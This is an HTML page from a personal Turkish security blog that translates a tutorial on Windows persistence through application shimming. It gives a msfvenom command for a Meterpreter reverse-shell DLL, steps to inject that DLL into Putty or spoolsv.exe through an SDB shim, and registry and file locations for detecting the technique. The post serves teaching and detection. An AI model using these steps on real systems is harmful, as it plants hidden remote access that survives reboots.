@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+    <head>
+        <meta charset="utf-8">
+        <title>    Application Shimming Kullanarak Windows Sistemler Üzerinde Kalıcılık
+</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href='https://fonts.googleapis.com/css?family=Gentium+Book+Basic|Merriweather:400,300' rel='stylesheet' type='text/css'>
+        <link rel="stylesheet" href="https://enesergun.net/theme/css/cid.css">
+        <link href="https://enesergun.net/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Enes Ergün Atom Feed" />
+    </head>
+    <body>
+        <!--[if lt IE 7]>
+            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
+        <![endif]-->
+
+            <div class="container">
+
+<header class="blog-header">
+    <h1><a href="https://enesergun.net" class="glitch" data-text="Enes Ergün">Enes Ergün</a></h1>
+    <p> Personel homepage about of my Profession </p>
+    <nav>
+        <a href="https://enesergun.net/">INDEX</a>
+        <a href="https://enesergun.net/archives">ARCHIVES</a>
+        <a href="https://enesergun.net/categories">CATEGORIES</a>
+    </nav>
+</header>
+
+    <div class="post">
+
+        <header>
+            <h1>Application Shimming Kullanarak Windows Sistemler Üzerinde Kalıcılık</h1>
+            <p class="date">Written on <time datetime="2019-12-21T15:00:00+03:00">Dec 21, 2019</time></p>
+        </header>
+
+        <article>
+            <p>Selamlar,</p>
+<p>Başlık bilgisinde geçen Application Shimming'i Türkçeye çevirmek oldukça zor bunun yerine anladığımı çevirdiğim yazıya ek olarak Shimming'in ne olduğunu/benim nasıl anladığımı yazmaya çalışacağım.</p>
+<p><strong>Not:</strong> Yazı benim araştırmış olduğum bir yazı olmayıp, okuyup beğendiğim, anladığımı düşündüğüm bir konu üzerinde aşağıdaki link üzerinden kendi halinde çevirilmiş bir yazıdır. Birebir ana kaynakla aynı değildir. </p>
+<h2>Shimming Nedir?</h2>
+<p>Windows sistemler üzerinde bir uygulamanın her sistemde çalışabilmesi adına çeşitli ayarlar barındıran bir dosyadır. <code>SDB</code> dosyası olarak sistemler üzerinde tutulmaktadır. Dosya format olarak XML dosya formatındadır. Bu sayede sistemler üzerinde admin veya geliştiriciler yüklü uygulamalar üzerinde <code>Uyumluluk</code> sorunlarını düzeltebiliyor veya patchleyebiliyorlar diyebiliriz.</p>
+<p>Örnek bir SDB Dosyası: <a href="https://github.com/williballenthin/python-sdb">Python-SDB</a></p>
+<p>Microsoft bu sebeple bir geliştirici kiti yayınlamıştır. Bu geliştirici kitinin ismi kısaca ADK'dır(Asssesment and Deployment Kit). 
+<a href="https://go.microsoft.com/fwlink/?linkid=2086042">ADK'yı indirmek İçin Tıklayın</a></p>
+<h2>Biz bu SDB Dosyası ile Ne yapacağız?</h2>
+<p>Yukarıda bahsetmiş olduğum <code>Uyumluluk</code> problemi için bu SDB dosyaları içerisinde InjectDLL diye bir seçenek bulundurmaktadır. Bunun sebebi geliştiricler eğer eski bir windows versiyonunda çalışacak uygulama varsa bu sisteme uygun DLL dosyasını uygulamaya dahil etmesini gerektirdiğindendir.</p>
+<p>Windows 10 sisteme bazı uygulamaların açılabilmesi için .Net Framework 4.5 ile birlikte Net Framework 3.5 yüklemek gibi düşünebiliriz. (Sadece örnektir, geriye dönük uyumluluğun anlaşılabilmesi için vs.)</p>
+<p>İşte bu InjectDLL özelliği bizim kullancağımız şeydir. Eğer biz burada bir uygulamaya istediğimiz bir DLL'i enjekte(!) edebilirsek bu sistem üzerinde kalıcılığı sağlamış oluruz. Üstelik görsel herhangi bir uyarı olmadan. </p>
+<p><strong>Not:</strong> Defcon 23'de bu konuyu işleyen, gündeme getiren <a href="https://twitter.com/secure_sean">Sean Pierce</a>'in orjinal sunum/videosu için aşağıdaki linki kullanabilirsiniz.</p>
+<p><a href="https://www.youtube.com/watch?v=LOsesi3QkXY">Abusing Native Shims for Post Exploitation</a></p>
+<h2>Uygun bir DLL Dosyası Hazırlamak</h2>
+<p>Burada siz isterseniz kendinize özel bir DLL dosyası hazırlayabilirsiniz fakat okuduğum örnekte bu DLL dosyası Reverse Shell almak için kullanılmaktadır. </p>
+<p>MSFVenom ile DLL Dosya formatında Reverse Shell oluşturmak için</p>
+<div class="highlight"><pre><span></span>msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; pentestlab.dll
+</pre></div>
+
+
+<h2>Arayüz ile Herhangi bir Uygulamaya DLL'i Enjekte Etmek</h2>
+<p>Bunun için Windows'un bize sunmuş olduğu ADK Toolkit uygulamasını açıyoruz ve burada sol sütundan Custom databases altında yeni bir database oluşturuyoruz. </p>
+<p><img alt="Windows ADK" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-combatibility-administrator.png"></p>
+<p>Örnek üzerinde Putty kullanılmış. Putty kullanılmasının nedeni ise sıkça kullanılan küçük bir uygulama olması ve sistem yöneticileri vs tarafından şüphe çekmeyen bir uygulama olmamasından dolayıdır. Kendisi bir clientdır.(SSH, Telnet etc.)</p>
+<p><img alt="Putty DLL Inject" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-create-application-fix.png"></p>
+<p>Aşağıdaki ekran görüntüsünde yukarıdaki ekranda next dedikten sonra InjectDLL seçeneğini seçiyoruz ve Next diyoruz.</p>
+<p><img alt="InjectDLL" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-inject-dll.png"></p>
+<p>Burada açılan ekranda ise InjectDLL'in bizden parametre isteyen ekranı açılacaktır. Bu ekranda <code>Command Line</code> kısmına biraz önce oluşturduğumuz DLL dosyasının konumunu veriyoruz.</p>
+<p><img alt="Options for InjectDLL" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-inject-dll-options.png"></p>
+<p>İşte bu kadar tüm işlemler tamamlandıktan sonra artık bir <code>sdb</code> dosyasına sahibiz. Buradan sonraki kısım ise bu <code>sdb</code> dosyasını sisteme eklemek.</p>
+<p>Bunun için </p>
+<div class="highlight"><pre><span></span>sdbinst olusturdugunuzsdb.sdb
+</pre></div>
+
+
+<p><img alt="SDB Install" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-installed.png"></p>
+<p>Evet artık her şeyimiz tamamlandı, sistem yöneticimiz ne zaman Putty'yi açarsa bize Reverse Shell düşecektir. Metasploit üzerinde Multi handler açıp sürekli dinleyerek nurtopu gibi bir meterpreter shell'e sahip olabilirsiniz. </p>
+<h2>Arayüz Olmadan Enjekte Etmek</h2>
+<p>Bunun için CLI üzerinden aşağıdaki komutunu girmeniz yeterli olacaktır.</p>
+<div class="highlight"><pre><span></span><span class="err">sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe</span>
+</pre></div>
+
+
+<p>Tabi burada illa kurulu bir uygulama olmasına gerek yok isterseniz Windows sistem üzerinde çalışan herhangi bir exe'ye de bunu enjekte edebilirsiniz. Okuduğum makale örneğinde <code>spoolsv.exe</code> dosyasına enjekte edilmiştir.</p>
+<h2>Peki Her Şey Güzel Biz Bu İşlem Olduğunda Anlayabilir Miyiz?</h2>
+<p>Sorunun kısa cevabı: Evet.
+Uzun cevap:</p>
+<p>Oluşturulan bu SDB dosyalarına ait kayıtlar Windows sistemler altında AppPatch klasörü altında tutulmaktadır. </p>
+<p>Bu klasöre ulaşmak için: </p>
+<div class="highlight"><pre><span></span><span class="c">%WINDIR%\AppPatch\custom</span>
+<span class="c">%WINDIR%\AppPatch\AppPatch64\Custom</span>
+</pre></div>
+
+
+<p>Ha bunun yerine isterseniz Process Explorer içerisinde de kaybolabilirsiniz.</p>
+<h2>Tespit etmek</h2>
+<p>Registry değişikliklerini veya dosya konumlarını izlemek bunun için bir yöntemdir. Takip edilecek Registry ve dosya konumları aşağıda verilmiştir. Oluşturulacak yeni bir key SysMon üzerinde <code>12</code> event ID ile tetiklenecektir. </p>
+<p>Registry konumları:</p>
+<div class="highlight"><pre><span></span><span class="err">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\</span>
+<span class="err">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\</span>
+</pre></div>
+
+
+<p>Dosya konumu:</p>
+<div class="highlight"><pre><span></span><span class="c">%WINDIR%\AppPatch\custom</span>
+<span class="c">%WINDIR%\AppPatch\AppPatch64\Custom</span>
+</pre></div>
+
+
+<p>Daha detaylı bir bilgi almak için Sean Price'ın <a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims.pdf">sunumunu</a> kullanabilirsiniz.</p>
+<p>Okuduğum yazı:
+<a href="https://pentestlab.blog/2019/12/16/persistence-application-shimming/">Persistence Application Shimming</a></p>
+<h2>Yazı Sonu</h2>
+<p>Konu nispeten eski bir konu fakat okuduğum kaynak yeni attığı için ben de çevirme ihtiyacı duydum o yüzden bu konuda bir eleştiri kabul etmeyeceğim :D Hoş kabul etsem de umurumda değil orası ayrı.</p>
+<p>Bu yazıyı dün sabaha doğru yazdım ve planım yazı sonuna doğru kendi duygu/durum, ülkenin hali(Nolacak bu ülkenin hali yav?), arkadaşlık ilişkileri(Arkadaşlardan ziyade tanıdıklarım kavramı) gibi içimdeki bir çok şeyi yazı sonuna dökecektim fakat gerek olmadığını düşünüyorum. Yine bir klasik olarak şarkı ile bu yazının sonunu getirelim hem konuya, hem boşvermişliklere uygun olsun.</p>
+<p><a href="http://www.youtube.com/watch?v=4eAQIXcvJ3A" title="Duygusal olmaya gerek yok"><img alt="" src="http://img.youtube.com/vi/4eAQIXcvJ3A/0.jpg"></a></p>
+        </article>
+
+        <footer>
+            <p>This entry is posted in <a href="https://enesergun.net/category/siber-guvenlik.html">siber güvenlik</a>.</p>
+        </footer>
+
+<div class="comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = '0x656e';
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+    </div>
+
+
+<footer class="blog-footer">
+
+    <ul class="nav">
+            <li><a href="www.twitter.com/0x656e">Twitter</a></li>
+            <li><a href="info@enesergun.net">Mail</a></li>
+    </ul>
+
+    <p class="disclaimer">
+    Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/hdra/Pelican-Cid">Cid</a> theme.
+    </p>
+</footer>
+            </div>
+<script>
+    var _gaq=[['_setAccount','UA-44262671-1'],['_trackPageview']];
+    (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+    g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+    s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+    </body>
+</html>
